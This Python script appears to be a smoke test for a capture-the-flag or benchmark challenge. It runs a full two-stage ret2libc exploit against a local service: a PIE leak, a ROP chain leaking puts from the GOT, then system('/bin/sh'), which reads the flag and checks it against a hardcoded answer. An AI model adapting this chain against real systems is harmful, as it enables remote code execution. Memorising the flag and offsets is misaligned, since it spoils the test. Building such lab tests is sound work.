#!/usr/bin/env python3
"""Smoke test for ret2libc-001 (port 9982): classic ret2libc, PIE ON.

Stage 1: the ROP chain aims puts@plt at the GOT slot for puts and
returns into main (the loop keeps the frame reachable). The leak rides
out as raw bytes.
Stage 2: the same overflow aims pop rdi at libc's "/bin/sh" and calls
libc's system; the shell cats the flag.

Offsets (bookworm gcc build, measured in the lab container):
  main            0x11bf
  pop_rdi; ret    0x118d  (inside pop_rdi_gadget, past the prologue)
  puts@plt        0x1030
  puts@GOT        0x4000
  vuln_copy frame: small[8] at rbp-8 -> 16 bytes padding to the ret slot
libc offsets (bookworm glibc 2.36):
  puts   0x77980
  system 0x4c490
  /bin/sh 0x197031
"""

import socket
import struct

HOST = "127.0.0.1"
PORT = 9982

OFF_MAIN = 0x11BF
OFF_GADGET = 0x118D
OFF_PUTS_PLT = 0x1030
OFF_PUTS_GOT = 0x4000
PAD = 16

LIBC_PUTS = 0x77980
LIBC_SYSTEM = 0x4C490
LIBC_BINSH = 0x197031

p64 = lambda x: struct.pack("<Q", x)


def recv_until(s, needle, limit=65536):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # 1. read the banner, parse main's PIE-shifted address
    banner = recv_until(s, b"name? ")
    idx = banner.find(b"main() at ") + len(b"main() at ")
    main_leak = int(banner[idx : idx + 14], 16)
    pie = main_leak - OFF_MAIN
    print(f"[+] main leaked {hex(main_leak)} -> pie base {hex(pie)}")

    gadget = pie + OFF_GADGET
    puts_got = pie + OFF_PUTS_GOT
    puts_plt = pie + OFF_PUTS_PLT
    main_addr = pie + OFF_MAIN

    # 2. stage 1: puts(puts_got) then back to main
    payload = b"A" * PAD + p64(gadget) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    s.send(payload + b"\n")

    # 3. the leak: puts prints the raw 6-byte libc address, then main
    #    re-prints the banner and asks for the name again
    data = recv_until(s, b"name? ")
    leak = struct.unpack("<Q", data[:6] + b"\x00\x00")[0]
    libc = leak - LIBC_PUTS
    print(f"[+] puts leaked {hex(leak)} -> libc base {hex(libc)}")

    # sanity: libc base must be page-aligned
    assert libc & 0xFFF == 0, f"libc base not page aligned: {hex(libc)}"

    # 4. stage 2: system("/bin/sh"). The bare ret gadget (0x118e) shifts
    #    the stack 8 bytes so system enters with rsp % 16 == 8 - the ABI
    #    do_system's SSE prologue demands.
    payload = (
        b"A" * PAD
        + p64(gadget)
        + p64(libc + LIBC_BINSH)
        + p64(pie + 0x118E)
        + p64(libc + LIBC_SYSTEM)
    )
    s.send(payload + b"\n")

    # 5. the shell: cat the flag
    s.send(b"cat ret2libc-001.flag\n")
    out = s.recv(4096)
    print(f"[+] shell output: {out.decode(errors='replace').strip()}")
    assert b"FLAG{mr5_ret2libc_leak_first}" in out, "oracle flag missing"
    print("[+] ret2libc-001 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
